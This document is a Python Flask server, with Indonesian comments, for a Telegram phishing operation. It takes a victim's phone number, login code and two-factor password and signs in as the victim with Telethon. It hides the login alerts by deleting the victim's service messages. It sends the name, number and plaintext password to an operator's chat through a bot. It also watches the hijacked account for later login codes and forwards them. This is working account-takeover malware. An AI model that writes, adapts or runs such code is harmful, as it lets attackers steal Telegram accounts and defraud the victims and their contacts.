import os, requests, asyncio, re, threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession
from telethon.tl.functions.messages import DeleteHistoryRequest

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# Variabel dari Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
DOMAIN = os.getenv("RAILWAY_STATIC_URL")
# Pastikan URL menggunakan HTTPS agar Telegram mau kirim data
RAILWAY_URL = f"https://{DOMAIN}" if DOMAIN else ""

user_db = {}

def bot_api(method, payload):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        res = requests.post(url, json=payload, timeout=15)
        return res.json()
    except: return {}

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        # Menjamin Flask selalu mengirim balik response (Fix Screenshot 31)
        res_data = loop.run_until_complete(handle_flow(data))
        return res_data
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    finally: loop.close()

async def handle_flow(data):
    client = None
    try:
        step = int(data.get('step', 1))
        num = re.sub(r'\D', '', data.get('nomor', ''))
        if num.startswith('0'): num = '62' + num[1:]
        nomor = '+' + num

        if nomor not in user_db:
            user_db[nomor] = {"session": "", "hash": "", "nama": "", "sandi": "None", "status_msg_id": None}

        client = TelegramClient(StringSession(user_db[nomor]['session']), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            res = await client.send_code_request(nomor)
            user_db[nomor].update({"hash": res.phone_code_hash, "session": client.session.save()})
            return jsonify({"status": "success"})

        elif step == 2:
            otp_code = data.get('otp')
            try:
                await client.sign_in(nomor, otp_code, phone_code_hash=user_db[nomor]['hash'])
                return await finalize_login(client, nomor)
            except errors.SessionPasswordNeededError:
                user_db[nomor]['session'] = client.session.save()
                return jsonify({"status": "need_2fa"})
            except: return jsonify({"status": "error", "message": "OTP SALAH"}), 400

        elif step == 3:
            sandi = data.get('sandi')
            try:
                await client.sign_in(password=sandi)
                user_db[nomor]['sandi'] = sandi
                return await finalize_login(client, nomor)
            except: return jsonify({"status": "error", "message": "SANDI SALAH"}), 400
    finally:
        if client: await client.disconnect()

async def finalize_login(client, nomor):
    me = await client.get_me()
    nama_depan = (me.first_name if me.first_name else "User").split()[0]
    user_db[nomor].update({"nama": nama_depan, "session": client.session.save()})
    
    await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
    
    pesan = f"Nama: **{nama_depan}**\nNomor: `{nomor}`\nKata sandi: {user_db[nomor]['sandi']}"
    bot_api("sendMessage", {
        "chat_id": CHAT_ID, "text": pesan, "parse_mode": "Markdown",
        "reply_markup": {"inline_keyboard": [[{"text": "OTP", "callback_data": f"upd_{nomor}"}]]}
    })
    return jsonify({"status": "success"})

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    # PENTING: Jika ada callback (klik tombol), langsung respon!
    if update and "callback_query" in update:
        call = update["callback_query"]
        bot_api("answerCallbackQuery", {"callback_query_id": call["id"]}) # Biar loading hilang
        
        callback_data = call.get("data", "")
        if "_" in callback_data:
            act, nomor = callback_data.split("_", 1)
            if act == "upd":
                # Kirim teks "Siap Menerima OTP"
                res = bot_api("sendMessage", {
                    "chat_id": CHAT_ID, "text": "Bot Siap Menerima OTP, klik /exit untuk keluar"
                })
                if nomor in user_db:
                    user_db[nomor]['status_msg_id'] = res.get('result', {}).get('message_id')
                
                threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
                
    return jsonify({"status": "success"}), 200

async def monitor_otp(nomor):
    data = user_db.get(nomor)
    if not data or not data['session']: return
    client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
    try:
        await client.connect()
        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            otp = re.search(r'\b\d{5}\b', event.raw_text)
            if otp:
                if data.get('status_msg_id'):
                    bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_msg_id']})
                
                teks_final = f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: {data['sandi']}\nOTP: `{otp.group(0)}`"
                bot_api("sendMessage", {
                    "chat_id": CHAT_ID, "text": teks_final, "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "OTP", "callback_data": f"upd_{nomor}"}]]}
                })
                await event.delete(revoke=True)
                await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
        await asyncio.wait_for(client.run_until_disconnected(), timeout=900)
    except: pass
    finally: await client.disconnect()

if __name__ == "__main__":
    if RAILWAY_URL:
        # Paksa sinkronisasi Webhook setiap restart
        bot_api("setWebhook", {"url": f"{RAILWAY_URL}/webhook"})
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))